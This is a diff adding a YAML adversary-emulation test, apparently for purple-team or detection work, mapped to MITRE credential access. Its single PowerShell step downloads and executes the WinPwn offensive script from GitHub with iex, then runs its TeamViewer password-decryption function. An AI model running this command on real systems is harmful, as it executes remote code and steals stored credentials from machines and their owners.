@@ -1,0 +1,19 @@
+api_version: "2.0"
+name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
+description: Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn
+uuid: db965264-3117-4bad-b7b7-2523b7856b92
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1555: Credentials from Password Stores'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---loot-local-credentials---decrypt-teamviewer-passwords
+      inline: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  "
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
